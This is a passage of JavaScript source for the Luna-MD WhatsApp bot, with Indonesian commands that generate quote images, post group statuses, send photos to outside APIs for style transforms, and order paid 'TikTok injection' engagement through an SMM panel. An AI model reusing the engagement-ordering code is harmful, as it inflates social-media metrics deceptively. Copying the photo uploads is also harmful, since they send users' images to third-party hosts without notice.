                file.on("finish", () => file.close(resolve))
              })
              .on("error", (err) => {
                fs.unlink(FONT_PATH, () => {})
                reject(err)
              })
          })
        }

        registerFont(FONT_PATH, { family: "SignFont" })
        global.__canvasSignFont = "SignFont"
      } catch (fontErr) {
        console.log("⚠️ Gagal load font custom, pakai font default:", fontErr.message)
      }
    }

    const FONT_FAMILY = global.__canvasSignFont

    if (!text) {
      return m.reply(
        `Contoh penggunaan:\n\n.papan Jangan Pernah berubah karena seseorang,Luna-MD`
      )
    }

    let [quote, author] = text.split(",")

    if (!quote) {
      return m.reply(
        `Contoh:\n\n.papan Jangan Pernah berubah karena seseorang,Luna-MD`
      )
    }

    quote = quote.trim().toUpperCase()
    author = author ? author.trim() : "Luna-MD"

    await m.reply("⏳ Membuat papan quote...")

    const bg = await loadImage(
      "https://img2.pixhost.to/images/8955/744172057_rafaofficial.jpg"
    )

    const W = bg.width
    const H = bg.height
    const canvas = createCanvas(W, H)
    const ctx = canvas.getContext("2d")

    ctx.drawImage(bg, 0, 0, W, H)

    const boxX = W * 0.255
    const boxY = H * 0.275
    const boxW = W * 0.49
    const boxH = H * 0.555

    function wrapText(ctx, text, maxWidth) {
      const words = text.trim().split(/\s+/)
      let lines = []
      let line = ""
      for (const word of words) {
        const testLine = line ? line + " " + word : word
        if (ctx.measureText(testLine).width > maxWidth) {
          if (line) lines.push(line)
          line = word
        } else {
          line = testLine
        }
      }
      if (line) lines.push(line)
      return lines
    }

    const paddingX = boxW * 0.1
    const MAX_WIDTH = boxW - paddingX * 2
    const MAX_HEIGHT = boxH * 0.78

    let fontSize = Math.floor(boxW * 0.135)
    let lines = []

    while (fontSize >= 20) {
      ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
      lines = wrapText(ctx, quote, MAX_WIDTH)
      const lineHeight = fontSize * 1.22
      const totalHeight = lines.length * lineHeight
      if (totalHeight <= MAX_HEIGHT) break
      fontSize -= 2
    }

    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    const lineHeight = fontSize * 1.22
    const totalHeight = lines.length * lineHeight
    const CENTER_X = boxX + boxW / 2
    const textBlockCenterY = boxY + boxH * 0.46
    const startY = textBlockCenterY - totalHeight / 2 + lineHeight / 2

    ctx.fillStyle = "#3a3a3a"
    ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
    for (let i = 0; i < lines.length; i++) {
      ctx.fillText(lines[i], CENTER_X, startY + i * lineHeight)
    }

    const creditSize = Math.floor(boxW * 0.058)
    ctx.font = `bold ${creditSize}px "${FONT_FAMILY}"`
    ctx.textAlign = "left"
    ctx.textBaseline = "alphabetic"
    ctx.fillStyle = "#3a3a3a"
    ctx.fillText(
      author,
      boxX + paddingX * 0.6,
      boxY + boxH - boxH * 0.05
    )

    const buffer = canvas.toBuffer("image/png")

    await luna.sendMessage(
      m.chat,
      {
        image: buffer,
        caption: "✅ Papan Quote Berhasil Dibuat"
      },
      { quoted: m }
    )

  } catch (e) {
    console.log(e)
    m.reply(`❌ Error:\n${e.message}`)
  }
}
break

case "fakecard":
case "quotecard": {
  try {

    const fs = require("fs")
    const path = require("path")
    const https = require("https")
    const { createCanvas, registerFont } = require("canvas")

    if (global.__canvasQuoteFont === undefined) {
      global.__canvasQuoteFont = "serif"

      try {
        const FONT_DIR = path.join(__dirname, "fonts")
        const FONT_PATH = path.join(FONT_DIR, "Lora-Regular.ttf")
        const FONT_ITALIC_PATH = path.join(FONT_DIR, "Lora-Italic.ttf")
        const FONT_URL =
          "https://raw.githubusercontent.com/google/fonts/main/ofl/lora/static/Lora-Regular.ttf"
        const FONT_ITALIC_URL =
          "https://raw.githubusercontent.com/google/fonts/main/ofl/lora/static/Lora-Italic.ttf"

        if (!fs.existsSync(FONT_DIR)) fs.mkdirSync(FONT_DIR, { recursive: true })

        const dl = (url, dest) =>
          new Promise((resolve, reject) => {
            if (fs.existsSync(dest)) return resolve()
            const file = fs.createWriteStream(dest)
            https
              .get(url, (res) => {
                if (res.statusCode !== 200) {
                  file.close()
                  fs.unlink(dest, () => {})
                  return reject(new Error(`HTTP ${res.statusCode}`))
                }
                res.pipe(file)
                file.on("finish", () => file.close(resolve))
              })
              .on("error", (err) => {
                fs.unlink(dest, () => {})
                reject(err)
              })
          })

        await dl(FONT_URL, FONT_PATH)
        await dl(FONT_ITALIC_URL, FONT_ITALIC_PATH)

        registerFont(FONT_PATH, { family: "QuoteFont", weight: "normal" })
        registerFont(FONT_ITALIC_PATH, { family: "QuoteFont", style: "italic" })
        global.__canvasQuoteFont = "QuoteFont"
      } catch (fontErr) {
        console.log("⚠️ Gagal load font custom, pakai font default:", fontErr.message)
      }
    }

    const FONT_FAMILY = global.__canvasQuoteFont

    if (!text) {
      return m.reply(
        `Contoh penggunaan:\n\n.canvas Jangan ragu menggapai bintang,@reallygreatsite`
      )
    }

    let [quote, author] = text.split(",")

    if (!quote) {
      return m.reply(
        `Contoh:\n\n.canvas Jangan ragu menggapai bintang,@reallygreatsite`
      )
    }

    quote = quote.trim()
    author = author ? author.trim() : "@Luna-MD"

    await m.reply("⏳ Membuat canvas quote...")

    const W = 720, H = 1280
    const canvas = createCanvas(W, H)
    const ctx = canvas.getContext("2d")

    const grad = ctx.createLinearGradient(0, 0, W, H)
    grad.addColorStop(0, "#cdbce8")
    grad.addColorStop(0.25, "#9c7fb5")
    grad.addColorStop(0.5, "#8a6b86")
    grad.addColorStop(0.75, "#a87a5e")
    grad.addColorStop(1, "#c08f4f")
    ctx.fillStyle = grad
    ctx.fillRect(0, 0, W, H)

    ctx.save()
    ctx.globalAlpha = 0.18
    ctx.fillStyle = "#3d2417"
    ctx.beginPath()
    ctx.ellipse(0, H, W * 0.55, H * 0.25, 0, 0, Math.PI * 2)
    ctx.fill()
    ctx.beginPath()
    ctx.ellipse(W, 0, W * 0.5, H * 0.18, 0, 0, Math.PI * 2)
    ctx.fill()
    ctx.restore()

    function roundRect(ctx, x, y, w, h, r) {
      ctx.beginPath()
      ctx.moveTo(x + r, y)
      ctx.arcTo(x + w, y, x + w, y + h, r)
      ctx.arcTo(x + w, y + h, x, y + h, r)
      ctx.arcTo(x, y + h, x, y, r)
      ctx.arcTo(x, y, x + w, y, r)
      ctx.closePath()
    }

    function drawSparkle(ctx, cx, cy, r) {
      ctx.save()
      ctx.beginPath()
      ctx.moveTo(cx, cy - r)
      ctx.bezierCurveTo(cx + r * 0.1, cy - r * 0.1, cx + r * 0.1, cy - r * 0.1, cx + r, cy)
      ctx.bezierCurveTo(cx + r * 0.1, cy + r * 0.1, cx + r * 0.1, cy + r * 0.1, cx, cy + r)
      ctx.bezierCurveTo(cx - r * 0.1, cy + r * 0.1, cx - r * 0.1, cy + r * 0.1, cx - r, cy)
      ctx.bezierCurveTo(cx - r * 0.1, cy - r * 0.1, cx - r * 0.1, cy - r * 0.1, cx, cy - r)
      ctx.closePath()
      ctx.fillStyle = "#fbdfa6"
      ctx.fill()
      ctx.lineWidth = Math.max(1.5, r * 0.05)
      ctx.strokeStyle = "#3d2417"
      ctx.stroke()
      ctx.restore()
    }

    const cardX = W * 0.076
    const cardY = H * 0.206
    const cardW = W * 0.847
    const cardH = H * 0.471
    const radius = W * 0.045

    roundRect(ctx, cardX, cardY, cardW, cardH, radius)
    ctx.fillStyle = "#f6f3ee"
    ctx.fill()
    ctx.lineWidth = 2.5
    ctx.strokeStyle = "#3d2417"
    ctx.stroke()

    const capW = cardW * 0.165
    const capH = cardH * 0.085
    const capX = cardX + cardW * 0.04
    const capY = cardY - capH * 0.55
    roundRect(ctx, capX, capY, capW, capH, capH / 2)
    ctx.fillStyle = "#fbdfa6"
    ctx.fill()
    ctx.lineWidth = 2.5
    ctx.strokeStyle = "#3d2417"
    ctx.stroke()

    ctx.font = `bold ${Math.floor(capH * 0.65)}px Georgia`
    ctx.fillStyle = "#3d2417"
    ctx.textAlign = "center"
    ctx.textBaseline = "middle"
    ctx.fillText("”", capX + capW / 2, capY + capH / 2 + capH * 0.05)

    
    drawSparkle(ctx, cardX + cardW - cardW * 0.045, cardY + cardH * 0.04, cardW * 0.038)
    drawSparkle(ctx, cardX + cardW * 0.06, cardY + cardH - cardH * 0.02, cardW * 0.042)

    function wrapText(ctx, text, maxWidth) {
      const words = text.trim().split(/\s+/)
      let lines = []
      let line = ""
      for (const word of words) {
        const testLine = line ? line + " " + word : word
        if (ctx.measureText(testLine).width > maxWidth) {
          if (line) lines.push(line)
          line = word
        } else {
          line = testLine
        }
      }
      if (line) lines.push(line)
      return lines
    }

    const paddingX = cardW * 0.12
    const MAX_WIDTH = cardW - paddingX * 2
    const MAX_HEIGHT = cardH * 0.58

    let fontSize = Math.floor(cardW * 0.105)
    let lines = []

    while (fontSize >= 22) {
      ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
      lines = wrapText(ctx, quote, MAX_WIDTH)
      const lineHeight = fontSize * 1.18
      const totalHeight = lines.length * lineHeight
      if (totalHeight <= MAX_HEIGHT) break
      fontSize -= 2
    }

    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    const lineHeight = fontSize * 1.18
    const totalHeight = lines.length * lineHeight
    const CENTER_X = cardX + cardW / 2
    const textBlockCenterY = cardY + cardH * 0.36
    const startY = textBlockCenterY - totalHeight / 2 + lineHeight / 2

    ctx.fillStyle = "#1a120a"
    for (let i = 0; i < lines.length; i++) {
      
      const isLast = i === lines.length - 1 && lines.length > 1
      ctx.font = `${isLast ? "bold italic" : "bold"} ${fontSize}px "${FONT_FAMILY}"`
      ctx.fillText(lines[i], CENTER_X, startY + i * lineHeight)
    }

    const dividerY = cardY + cardH * 0.685
    ctx.strokeStyle = "#1a120a"
    ctx.lineWidth = 2
    ctx.beginPath()
    ctx.moveTo(cardX + cardW * 0.12, dividerY)
    ctx.lineTo(cardX + cardW - cardW * 0.12, dividerY)
    ctx.stroke()

    const authorSize = Math.floor(fontSize * 0.46)
    ctx.font = `italic ${authorSize}px "${FONT_FAMILY}"`
    ctx.textAlign = "center"
    ctx.fillStyle = "#1a120a"
    ctx.fillText(author, CENTER_X, dividerY + cardH * 0.085)

    const btnW = cardW * 0.56
    const btnH = H * 0.055
    const btnX = W / 2 - btnW / 2
    const btnY = cardY + cardH + H * 0.085

    roundRect(ctx, btnX, btnY, btnW, btnH, btnH / 2)
    ctx.fillStyle = "#fbdfa6"
    ctx.fill()
    ctx.lineWidth = 2.5
    ctx.strokeStyle = "#3d2417"
    ctx.stroke()

    ctx.font = `italic bold ${Math.floor(btnH * 0.38)}px "${FONT_FAMILY}"`
    ctx.textAlign = "center"
    ctx.fillStyle = "#1a120a"
    ctx.fillText("Bagikan kutipan", W / 2, btnY + btnH / 2 + btnH * 0.04)

    const buffer = canvas.toBuffer("image/png")

    await luna.sendMessage(
      m.chat,
      {
        image: buffer,
        caption: "✅ Canvas Quote Berhasil Dibuat"
      },
      { quoted: m }
    )

  } catch (e) {
    console.log(e)
    m.reply(`❌ Error:\n${e.message}`)
  }
}
break

case "swgc2": {
    if (!isOwner) return m.reply(mess.owner)

    const tempSelections = global.tempGroupStatusSelections;
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const fullText = m.body.replace(new RegExp(`^\\${prefix}${command}\\s*`, "i"), "").trim();
    const isGroupSelection = fullText.match(/^select_group_\d+$/);
    const caption = isGroupSelection ? "" : fullText;

    const groups = await getGroupList(luna);
    if (groups.length === 0) {
        return m.reply("❌ Bot tidak berada di dalam grup manapun saat ini.");
    }

    const userId = m.sender;
    const pending = tempSelections.get(userId);

    if (pending && isGroupSelection) {
        const groupIndex = parseInt(fullText.replace('select_group_', ''));

        if (!isNaN(groupIndex) && groups[groupIndex]) {
            const targetGroup = groups[groupIndex];
            const jid = targetGroup.id;

            try {
                let payload = {};

                if (pending.mime && /image/.test(pending.mime)) {
                    payload = { image: pending.buffer, caption: pending.caption };
                } else if (pending.mime && /video/.test(pending.mime)) {
                    payload = { video: pending.buffer, caption: pending.caption };
                } else if (pending.mime && /audio/.test(pending.mime)) {
                    payload = { audio: pending.buffer };
                } else if (pending.caption) {
                    payload = { text: pending.caption };
                }

                await luna.sendMessage(jid, { groupStatusMessage: payload });

                await luna.sendMessage(m.chat, {
                    react: { text: "✅", key: m.key }
                });

                await m.reply(`✅ Status grup berhasil dikirim ke *${targetGroup.subject}*`);
                tempSelections.delete(userId);

            } catch (err) {
                console.error("❌ Error:", err);
                await m.reply("❌ Terjadi kesalahan saat mengirim status grup.");
            }
        } else {
            await m.reply("❌ Pilihan grup tidak valid, coba ulangi lagi.");
        }
        break;
    }

    const groupButtons = groups.map((group, index) => ({
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
            display_text: group.subject,
            id: `${prefix}swgc2 select_group_${index}`
        })
    }));

    if ((mime || caption) && !isGroupSelection) {
        let buffer = null;
        if (mime) buffer = await quoted.download();

        tempSelections.set(userId, { mime: mime || null, caption: caption || "", buffer });

        const MenuX = {
            interactiveMessage: {
                title: `📋 *PILIH GRUP TUJUAN*\n\n${mime ? '📎 Media terdeteksi' : '📝 Teks: ' + (caption.length > 50 ? caption.substring(0, 50) + '...' : caption)}`,
                footer: "Luna-MD",
                nativeFlowMessage: {
                    messageParamsJson: JSON.stringify({
                        bottom_sheet: {
                            in_thread_buttons_limit: 2,
                            divider_indices: [1],
                            list_title: `Daftar Grup (${groups.length})`,
                            button_title: "Pilih Grup Tujuan"
                        }
                    }),
                    buttons: groupButtons
                }
            }
        };

        await luna.sendMessage(m.chat, MenuX, { quoted: m });
        break;
    }

    const MenuX = {
        interactiveMessage: {
            title: `📋 *PILIH GRUP UNTUK STATUS*\n\nBot tergabung dalam *${groups.length}* grup.\nReply media/teks lalu jalankan ulang command ini, atau langsung pilih grup buat kirim teks kosong.`,
            footer: "Luna-MD",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1],
                        list_title: `Daftar Grup (${groups.length})`,
                        button_title: "Pilih Grup Tujuan"
                    }
                }),
                buttons: groupButtons
            }
        }
    };

    await luna.sendMessage(m.chat, MenuX, { quoted: m });
}
break;

case "dj":
case "fakedj": {
  try {

    const fs = require("fs")
    const path = require("path")
    const https = require("https")
    const { createCanvas, loadImage, registerFont } = require("canvas")

    
    
    
    if (global.__canvasQuoteFont === undefined) {
      global.__canvasQuoteFont = "sans-serif"

      try {
        const FONT_DIR = path.join(__dirname, "fonts")
        const FONT_PATH = path.join(FONT_DIR, "Cinzel-Bold.ttf")
        const FONT_URL =
          "https://raw.githubusercontent.com/google/fonts/main/ofl/cinzel/static/Cinzel-Bold.ttf"

        if (!fs.existsSync(FONT_DIR)) {
          fs.mkdirSync(FONT_DIR, { recursive: true })
        }

        if (!fs.existsSync(FONT_PATH)) {
          await new Promise((resolve, reject) => {
            const file = fs.createWriteStream(FONT_PATH)
            https
              .get(FONT_URL, (res) => {
                if (res.statusCode !== 200) {
                  file.close()
                  fs.unlink(FONT_PATH, () => {})
                  return reject(new Error(`HTTP ${res.statusCode}`))
                }
                res.pipe(file)
                file.on("finish", () => file.close(resolve))
              })
              .on("error", (err) => {
                fs.unlink(FONT_PATH, () => {})
                reject(err)
              })
          })
        }

        registerFont(FONT_PATH, { family: "QuoteFont" })
        global.__canvasQuoteFont = "QuoteFont"
      } catch (fontErr) {
        console.log("⚠️ Gagal load font custom, pakai font default:", fontErr.message)
      }
    }

    const FONT_FAMILY = global.__canvasQuoteFont

    
    
    
    if (!text) {
      return m.reply(
        `Contoh penggunaan:\n\n.canvas Aku hanya istrhat bukan redup,@Luna-MD`
      )
    }

    let [quote, author] = text.split(",")

    if (!quote) {
      return m.reply(
        `Contoh:\n\n.canvas Kita tidak tumpang cuma redup jadi jangan takut ber saing,@Luna-MD`
      )
    }

    quote = quote.trim()
    author = author ? author.trim() : "@Luna-MD"

    await m.reply("⏳ Membuat canvas quote...")

    
    
    
    const bg = await loadImage(
      "https://img2.pixhost.to/images/8924/743599313_rafaofficial.jpg"
    )

    const canvas = createCanvas(bg.width, bg.height)
    const ctx = canvas.getContext("2d")

    
    ctx.drawImage(bg, 0, 0, bg.width, bg.height)

    
    
    
    const W = bg.width
    const H = bg.height

    const overlayX = W * 0.1
    const overlayY = H * 0.3
    const overlayW = W * 0.8
    const overlayH = H * 0.42

    ctx.save()
    ctx.globalAlpha = 0.35
    ctx.fillStyle = "#000015"
    ctx.beginPath()
    ctx.roundRect(overlayX, overlayY, overlayW, overlayH, 20)
    ctx.fill()
    ctx.globalAlpha = 1
    ctx.restore()

    
    
    
    const CENTER_X = W / 2
    const CENTER_Y = H * 0.51

    const MAX_WIDTH = W * 0.68
    const MAX_HEIGHT = H * 0.32

    
    
    
    function wrapText(ctx, text, maxWidth) {
      const words = text.trim().split(/\s+/)
      let lines = []
      let line = ""

      for (const word of words) {
        const testLine = line ? line + " " + word : word
        if (ctx.measureText(testLine).width > maxWidth) {
          if (line) lines.push(line)
          line = word
        } else {
          line = testLine
        }
      }

      if (line) lines.push(line)
      return lines
    }

    
    
    
    let fontSize = Math.floor(W * 0.065)
    let lines = []

    while (fontSize >= 24) {
      ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
      lines = wrapText(ctx, quote, MAX_WIDTH)
      const lineHeight = fontSize * 1.25
      const totalHeight = lines.length * lineHeight
      if (totalHeight <= MAX_HEIGHT) break
      fontSize -= 2
    }

    
    
    
    ctx.font = `bold ${fontSize}px "${FONT_FAMILY}"`
    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    const lineHeight = fontSize * 1.25
    const totalHeight = lines.length * lineHeight
    const startY = CENTER_Y - totalHeight / 2 + lineHeight / 2

    
    ctx.shadowColor = "#3377ff"
    ctx.shadowBlur = 24

    ctx.fillStyle = "#ddeeff"

    for (let i = 0; i < lines.length; i++) {
      ctx.fillText(lines[i], CENTER_X, startY + i * lineHeight)
    }

    
    
    
    ctx.shadowBlur = 0
    ctx.strokeStyle = "rgba(160, 80, 255, 0.6)"
    ctx.lineWidth = 1.5
    const dividerY = startY + totalHeight + 18
    ctx.beginPath()
    ctx.moveTo(CENTER_X - 90, dividerY)
    ctx.lineTo(CENTER_X + 90, dividerY)
    ctx.stroke()

    
    
    
    const authorSize = Math.floor(fontSize * 0.55)
    ctx.font = `bold ${authorSize}px "${FONT_FAMILY}"`
    ctx.fillStyle = "#cc88ff"
    ctx.shadowColor = "#aa44ff"
    ctx.shadowBlur = 16
    ctx.textAlign = "center"
    ctx.fillText(author, CENTER_X, dividerY + authorSize + 10)

    ctx.shadowBlur = 0

    
    
    
    const buffer = canvas.toBuffer("image/png")

    await luna.sendMessage(
      m.chat,
      {
        image: buffer,
        caption: "✅ Canvas Quote Berhasil Dibuat"
      },
      { quoted: m }
    )

  } catch (e) {
    console.log(e)
    m.reply(`❌ Error:\n${e.message}`)
  }
}
break

case "tocomic": {
try {

if (!/image/.test(mime))
return m.reply("Reply foto dengan command *.tocomic*")

await m.reply("⏳ Sedang mengubah gambar menjadi Comic...")

const axios = require("axios")
const FormData = require("form-data")
const fs = require("fs")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

let form = new FormData()
form.append("file", fs.createReadStream(media))

let { data } = await axios.post(
"https://api-nexaku.my.id/transform/comic",
form,
{
headers: {
...form.getHeaders()
},
responseType: "arraybuffer",
maxBodyLength: Infinity,
maxContentLength: Infinity
}
)

if (fs.existsSync(media)) fs.unlinkSync(media)

await luna.sendMessage(
m.chat,
{
image: Buffer.from(data),
caption: `📖 *Comic AI*

✅ Gambar berhasil diubah menjadi style Comic.`
},
{ quoted: m }
)

} catch (e) {

if (typeof media !== "undefined" && fs.existsSync(media))
fs.unlinkSync(media)

console.log(e.response?.data || e)

m.reply(`❌ Gagal memproses gambar

${e.response?.status || ""}
${e.message}`)

}
}
break

case "tochibi": {
try {
const fs = require("fs")
const axios = require("axios")
const { ImageUploadService } = require("node-upload-images")

if (!/image/.test(mime))
return m.reply(`Reply foto dengan caption *${prefix + command}*`)

await m.reply("⏳ Mengupload gambar...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const service = new ImageUploadService("pixhost.to")
let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
"luna-md.jpg"
)

fs.unlinkSync(media)

await m.reply("🎨 Sedang membuat gambar Chibi...")

const response = await axios({
method: "GET",
url: `https://api.nexray.eu.cc/ephoto/chibi?url=${encodeURIComponent(directLink)}`,
responseType: "arraybuffer",
validateStatus: () => true
})

const type = response.headers["content-type"] || ""


if (type.startsWith("image/")) {
return await luna.sendMessage(
m.chat,
{
image: Buffer.from(response.data),
caption: "✅ Berhasil mengubah gambar menjadi Chibi."
},
{ quoted: m }
)
}


let json = {}
try {
json = JSON.parse(Buffer.from(response.data).toString())
} catch {}

if (!json.status) {
return m.reply(`❌ ${json.error || "Gagal memproses gambar."}`)
}

let hasil =
json.result ||
json.result_url ||
json.url ||
json.image ||
json.output ||
json.data?.url ||
json.data?.result

if (!hasil) {
return m.reply("❌ URL hasil tidak ditemukan.")
}

await luna.sendMessage(
m.chat,
{
image: { url: hasil },
caption: "✅ Berhasil mengubah gambar menjadi Chibi."
},
{ quoted: m }
)

} catch (e) {
console.log(e.response?.data || e)
m.reply(`❌ Error\n${e.message}`)
}
}
break

case "toghibli": {
try {

if (!/image/.test(mime)) {
return reply(`Contoh:\n${prefix + command} reply foto`);
}

Reply("⏳ Upload gambar ke PixHost...");

const fs = require("fs");
const axios = require("axios");
const { ImageUploadService } = require("node-upload-images");


let media = await luna.downloadAndSaveMediaMessage(qmsg);


const service = new ImageUploadService("pixhost.to");
let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
"luna-md.jpg"
);

fs.unlinkSync(media);

Reply("🎨 Sedang membuat gambar Ghibli...");


const api = `https://api.nexray.eu.cc/ephoto/ghibli?url=${encodeURIComponent(directLink)}`;

const { data } = await axios.get(api, {
responseType: "arraybuffer"
});


await luna.sendMessage(
m.chat,
{
image: Buffer.from(data),
caption: `*🌸 TO GHIBLI SUCCESS*\n\n🔗 Source : ${directLink}`
},
{ quoted: m }
);

} catch (e) {
console.log(e);
Reply("❌ Gagal membuat gambar Ghibli.\n\n" + e.message);
}
}
break;

case "wink": {
try {

if (!text) {
return m.reply(`Contoh:

.wink hd

Reply foto lalu ketik mode.

Mode:
• hd`)
}

if (!/image/.test(mime)) {
return m.reply("Reply foto dengan caption .wink hd")
}

await m.reply("⏳ Sedang mengupload gambar...")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to')

let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
'rafaofficial.png'
)

fs.unlinkSync(media)

await m.reply("🎨 Sedang memproses dengan Wink AI...")

const axios = require("axios")

let api = `https://api.azbry.com/api/tools/wink?url=${encodeURIComponent(directLink)}&mode=${encodeURIComponent(text.trim())}`

let { data } = await axios.get(api)

if (!data.status) {
return m.reply("❌ Gagal memproses gambar")
}

let hasil = data.result.result_url

await luna.sendMessage(
m.chat,
{
image: { url: hasil },
caption: `✨ *Wink AI Editor*

📌 Mode : ${data.result.mode}
🖼️ Input : Reply Foto

✅ Berhasil diproses`
},
{ quoted: m }
)

} catch (e) {
console.log(e)
m.reply(`❌ Error:\n${e.message}`)
}
}
break

case "ttqc": {
if (!m.quoted) return m.reply("❌ Reply foto terlebih dahulu!")
if (!text || !text.includes("|")) return m.reply("❌ Format: .ttqc name|text")

let [name, pesan] = text.split("|")
name = name.trim()
pesan = pesan.trim()

if (!name || !pesan) return m.reply("❌ Name dan text tidak boleh kosong!")
if (!/image/.test(mime)) return m.reply("❌ Reply foto!")

await m.reply("⏳ Tunggu sebentar...")

try {
let media = await luna.downloadAndSaveMediaMessage(qmsg)
if (!media) return m.reply("❌ Gagal mengunduh foto!")

const { ImageUploadService } = require("node-upload-images")
const service = new ImageUploadService("pixhost.to")

let { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
"rafaofficial.png"
)

let imageUrl = directLink.toString()

let apiUrl =
`https://apii.nexadev.my.id/ttqc` +
`?url=${encodeURIComponent(imageUrl)}` +
`&name=${encodeURIComponent(name)}` +
`&text=${encodeURIComponent(pesan)}`

let hasil = await fetch(apiUrl)

if (!hasil.ok) throw new Error("API Error: " + hasil.status)

let buffer = Buffer.from(await hasil.arrayBuffer())

await luna.sendMessage(
m.chat,
{
image: buffer,
caption: "✨ TTQC berhasil dibuat!"
},
{ quoted: m }
)

if (fs.existsSync(media)) await fs.unlinkSync(media)

} catch (e) {
console.error(e)
m.reply(`❌ Gagal membuat TTQC!\n${e.message}`)
}

}
break



case 'ceksaldo': {
try {

const axios = require('axios')

await m.reply('⏳ Mengecek saldo...')

const { data } = await axios.post(
`https://fayupedia.id/api/services`,
new URLSearchParams({
api_id: global.idapi,
api_key: global.apitiktok
}),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded',
'Accept': 'application/json',
'User-Agent': 'Mozilla/5.0'
}
}
)




if (!data) {
return m.reply('❌ Tidak ada respon dari server')
}

if (data.status !== true) {
return m.reply(`❌ ${data.msg || 'Gagal cek saldo'}`)
}

Reply(`
💰 *CEK SALDO*

📊 Balance: Rp${data.balance}
📌 Status: ${data.msg}
`)

} catch (e) {
console.log(e)

m.reply(
`❌ Error\n\n${e.response?.data?.msg || e.message}`
)
}
}
break

case 'pesantt': {
try {

const axios = require('axios')







if (!text) {
return m.reply(`📦 *PESANTT ORDER*

Cara pakai:
.pesantt <service>|<target>|<quantity>

Contoh:
.pesantt 9|sebastianwirajaya11|100`)
}

const parts = text.split('|')

if (parts.length < 3) {
return m.reply(`❌ Format salah

Contoh:
.pesantt 9|username|100`)
}

const service = parts[0].trim()
const target = parts[1].trim()
const quantity = parseInt(parts[2])

if (isNaN(service) || isNaN(quantity)) {
return m.reply(`❌ Service dan quantity harus angka`)
}

if (!target) {
return m.reply(`❌ Target tidak boleh kosong`)
}

await m.reply('⏳ Mengirim pesanan...')

const { data } = await axios.post(
`https://fayupedia.id/api/order`,
new URLSearchParams({
api_id: global.idapi,
api_key: global.apitiktok,
service: service,
target: target,
quantity: quantity
}),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded',
'Accept': 'application/json',
'User-Agent': 'Mozilla/5.0'
}
}
)




if (!data) {
return m.reply('❌ Tidak ada respon dari server')
}

if (data.status !== true) {
return m.reply(`❌ ${data.msg || 'Gagal membuat pesanan'}`)
}

Reply(`
✅ *ORDER BERHASIL*

📦 Pesanan ID: #${data.order}
📌 Status: Diproses
🎯 Target: ${target}
📊 Quantity: ${quantity}
🧾 Service ID: ${service}
`)

} catch (e) {
console.log(e)

m.reply(
`❌ Error\n\n${e.response?.data?.msg || e.message}`
)
}
}
break

case 'ordertt': {
try {
const axios = require('axios')

await m.reply('⏳ Mengambil layanan TikTok...')

const { data } = await axios.post(
'https://fayupedia.id/api/services',
new URLSearchParams({
api_id: global.idapi,
api_key: global.apitiktok
}),
{
headers: {
'Content-Type': 'application/x-www-form-urlencoded',
'Accept': 'application/json',
'User-Agent': 'Mozilla/5.0'
}
}
)

if (!data?.status) {
return m.reply(`❌ ${data?.msg || 'Gagal mengambil data layanan'}`)
}

const ids = [1734, 1334, 1335, 1336, 1337, 1338]

const services = []

for (const id of ids) {
const svc = data.services.find(v => Number(v.id) === id)
if (svc) services.push(svc)
}

if (!services.length) {
return m.reply('❌ Layanan TikTok tidak ditemukan')
}

let menu = `📦 *LIST SUNTIK TIKTOK*

Silahkan copy ID layanan menggunakan tombol dibawah.

Contoh Order :

.pesantt

─────────────────

`

services.forEach((s, i) => {
menu += `${i + 1}. ${s.name}

🆔 ID : ${s.id}
💰 Harga : Rp${Number(s.price).toLocaleString('id-ID')}
📉 Min : ${s.min}
📈 Max : ${s.max}
🔁 Refill : ${s.refill ? 'Yes' : 'No'}

`
})

const MenuX = {
interactiveMessage: {
title: menu,
footer: "TikTok Suntik Service",
thumbnail: "https://img2.pixhost.to/images/8879/743054640_rafaofficial.jpg",
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
limited_time_offer: {
text: "TikTok Service",
url: "https://t.me/noxXza.exe",
copy_code: "TikTok",
expiration_time: Date.now() * 999
},
bottom_sheet: {
in_thread_buttons_limit: 2,
divider_indices: [1,2,3,4,5,6,7,999],
list_title: "TikTok Service",
button_title: "📋 Pilih Copy Code Tiktok"
},
tap_target_configuration: {
title: "▸ X ◂",
description: "TikTok Service",
canonical_url: "https://t.me/noxXza.exe",
domain: "shop.example.com",
button_index: 0
}
}),
buttons: [

{
name: "single_select",
buttonParamsJson: JSON.stringify({
has_multiple_buttons: true
})
},

{
name: "call_permission_request",
buttonParamsJson: JSON.stringify({
has_multiple_buttons: true
})
},

{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "🛒 ORDER TIKTOK",
id: ".pesantt"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📦 ID 1734",
id: "-",
copy_code: "1734"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📦 ID 1334",
id: "-",
copy_code: "1334"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📦 ID 1335",
id: "-",
copy_code: "1335"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📦 ID 1336",
id: "-",
copy_code: "1336"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📦 ID 1337",
id: "-",
copy_code: "1337"
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📦 ID 1338",
id: "-",
copy_code: "1338"
})
}

]
}
}
}

await luna.sendMessage(
m.chat,
MenuX,
